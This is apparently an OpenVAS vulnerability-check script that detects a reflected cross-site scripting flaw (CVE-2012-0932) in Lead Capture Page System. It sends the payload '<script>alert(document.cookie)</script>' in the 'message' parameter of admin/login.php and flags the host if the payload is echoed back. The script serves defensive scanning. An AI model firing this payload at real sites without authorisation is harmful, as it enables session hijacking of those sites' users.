###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_lead_capture_page_system_xss_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Lead Capture Page System 'message' Parameter Cross Site Scripting Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in context of an affected site.
  Impact Level: Application";
tag_affected = "Lead Capture Page System";
tag_insight = "The flaw is due to an input passed to the 'message' parameter in
  'admin/login.php' is not properly sanitised before being returned to the
  user.";
tag_solution = "No solution or patch is available as of 2nd, February 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://leadcapturepagesystem.com/";
tag_summary = "This host is running Lead Capture Page System and is prone to
  cross site scripting vulnerability.";

if(description)
{
  script_id(802577);
  script_version("$Revision: 12 $");
  script_cve_id("CVE-2012-0932");
  script_bugtraq_id(51785);
  script_tag(name:"cvss_base", value:"5.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:N/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-02-02 13:13:46 +0530 (Thu, 02 Feb 2012)");
  script_name("Lead Capture Page System 'message' Parameter Cross Site Scripting Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/78455");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/47702");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/72623");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/108887/leadcapturepagesystem-xss.txt");

  script_description(desc);
  script_summary("Check if Lead Capture Page System is prone to XSS");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Check host supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get the host name
host = get_host_name();
if(!host){
  exit(0);
}

foreach dir (make_list("/", "/leadcapturepagesystem", cgi_dirs()))
{
  sndReq = string("GET ", dir, "/login.php HTTP/1.1", "\r\n",
                  "Host: ", host, "\r\n\r\n");
  rcvRes = http_send_recv(port:port, data:sndReq);

  ## Confirm the application
  if(egrep(pattern:'Powered By <a href="http://leadcapturepagesystem.com/',
           string:rcvRes))
  {
    ## Construct attack
    sndReq = string("GET ", dir, "/admin/login.php?message=<script>alert(",
                    "document.cookie)</script> HTTP/1.1", "\r\n",
                    "Host: ", host, "\r\n\r\n");
    rcvRes = http_send_recv(port:port, data:sndReq);

    ## Confirm the exploit
    if("<script>alert(document.cookie)</script>" >< rcvRes)
    {
      security_hole(port:port);
      exit(0);
    }
  }
}
